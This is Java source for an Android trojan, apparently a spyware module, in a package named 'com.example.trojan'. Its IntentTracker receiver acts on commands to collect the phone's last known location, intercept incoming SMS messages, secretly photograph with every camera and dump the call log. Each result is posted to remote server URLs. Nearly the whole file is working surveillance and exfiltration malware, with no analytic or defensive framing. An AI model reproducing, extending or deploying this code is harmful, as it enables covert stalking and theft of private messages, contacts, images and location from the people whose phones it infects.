package com.example.trojan;

import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.hardware.Camera;
import android.location.Location;
import android.location.LocationManager;
import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.Bundle;
import android.provider.CallLog;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;

public class IntentTracker extends BroadcastReceiver{

	
	@SuppressWarnings("deprecation")
	@Override
	public void onReceive(final Context context, Intent intent){
		
		List<String> res = new ArrayList<String>();
		
		try{
		if(intent.getAction().equals("GetLastKnownLocation")){
			
	   LocationManager lm = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
	   for(String provider : lm.getAllProviders()){
		   Location loc = lm.getLastKnownLocation(provider);
			if(loc!=null){
			String s = provider+": time: "+loc.getTime()+" lat:"+loc.getLatitude()+", lon:"+loc.getLongitude();
			res.add(s);
			Log.d(MyService.LOG_TAG, s);
			}
	   }
	   if(res.size()>0){
	   Runnable uploader = new HttpPoster(MyService.post_url,res); // отсылаем результат
	   new Thread(uploader).start();}
	   else{
		   Runnable uploader = new HttpPoster(MyService.post_url,"no last location"); // отсылаем результат
		   new Thread(uploader).start();
	   }
			
		}
		
		else if(intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")){
	            Bundle bundle = intent.getExtras();          
	            SmsMessage[] msgs = null;
	            String msg_from;
	            if (bundle != null){
	            	res.add("time: "+Long.toString(System.currentTimeMillis()/1000));
	                try{
	                	Log.d(MyService.LOG_TAG, "got SMS!");
	                    Object[] pdus = (Object[]) bundle.get("pdus");
	                    msgs = new SmsMessage[pdus.length];
	                    for(int i=0; i<msgs.length; i++){
	                        msgs[i] = SmsMessage.createFromPdu((byte[])pdus[i]);
	                        msg_from = msgs[i].getOriginatingAddress();
	                        String msgBody = msgs[i].getMessageBody();
	                        Log.d(MyService.LOG_TAG, "from:"+msg_from);
	                        res.add("from:"+msg_from);
		                    Log.d(MyService.LOG_TAG, "text:"+msgBody);
		                    res.add("text:"+msgBody); }
		                    
	                    Log.d(MyService.LOG_TAG, "sending sms to server..");
		                 Runnable uploader = new HttpPoster(MyService.log_url,res); // отсылаем результат
		             	 new Thread(uploader).start();
		                    
	                    }	                    
	                catch(Exception e){
	                           Log.d(MyService.LOG_TAG, "error getting sms\n"+e.toString());
	                } 
	            }
	        }
		
		
		else if(intent.getAction().equals("photoshoot")){
			
			new Thread(new Runnable() {
			     public void run() {

			int cameras_ids=0;
			Camera camera;
			try{        			
		        if (context.getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA)) {

		            cameras_ids=Camera.getNumberOfCameras();
		              for(int i=0;i<cameras_ids;i++){
		            	 camera = Camera.open(i);
		                 camera.takePicture(null, null,new PhotoHandler(context));
		                 Thread.sleep(10000); // чтобы снимок успел обработаться
		                 camera=null;
		              }
		               
		              Runnable sender = new HttpPoster(MyService.post_url,"photos were made");
		             	 new Thread(sender).start();
		             	Log.d(MyService.LOG_TAG, "photoshoot done"); 
		              
		            }
		    }
		
			catch (Exception e){
				Log.d(MyService.LOG_TAG, "error taking photos\n"+e.toString());
				 Runnable sender = new HttpPoster(MyService.post_url,"error taking photos");
             	 new Thread(sender).start();
			}			
			     }
		    }).start();
		}
		
		
		
else if(intent.getAction().equals("getcalllogs")){
	new Thread(new Runnable() {
	     public void run() {
	    	 
	  try{  	 
	    	 List<String> res = new ArrayList<String>();	 
		Cursor c = context.getContentResolver().query(
			Uri.parse("content://call_log/calls"), null, null, null, null);
	
	while (c.moveToNext()) {
			 Date date = new Date(Long.valueOf(c.getString(c.getColumnIndex(CallLog.Calls.DATE))));
			 String num= c.getString(c.getColumnIndex(CallLog.Calls.NUMBER));
			 String name= c.getString(c.getColumnIndex(CallLog.Calls.CACHED_NAME));
			 String duration = c.getString(c.getColumnIndex(CallLog.Calls.DURATION));
			 int type = Integer.parseInt(c.getString(c.getColumnIndex(CallLog.Calls.TYPE)));
			 String dir="?";
	            switch (type) {
	            case CallLog.Calls.OUTGOING_TYPE:
	                dir = "-->";
	                break;

	            case CallLog.Calls.INCOMING_TYPE:
	                dir = "<--";
	                break;

	            case CallLog.Calls.MISSED_TYPE:
	                dir = "X";
	                break;
	            }
			 res.add(date+"  "+dir+" "+name+"  "+num+" ("+duration+"s)");
			 }
			c.close();    
			
			if(res.size()>0){
				Runnable sender = new HttpPoster(MyService.post_url,res);
            	 new Thread(sender).start();
			}else{
				Runnable sender = new HttpPoster(MyService.post_url,"call logs are empty");
           	 new Thread(sender).start();
			}
	  } catch(Exception e){
		  
		  Runnable sender = new HttpPoster(MyService.post_url,"error getting call logs");
      	 new Thread(sender).start();
		  
	  }
}
	    }).start();  	 
			
		}
		
//	    location = (Location) intent.getExtras().get(LocationManager.KEY_LOCATION_CHANGED);
//		if(location!=null){
//		lat = location.getLatitude(); // широта
//		lng = location.getLongitude(); // долгота
//		time = location.getTime(); // unix time
//		Log.d(LOG_TAG, "time: "+time+"\nlat: "+lat+"\nlon: "+lng);}
		
		
			}
		catch (Exception e){
			Log.d(MyService.LOG_TAG, "error processing intent in StaticBroadcast\n"+e.toString());
						}
		
		}
	
}

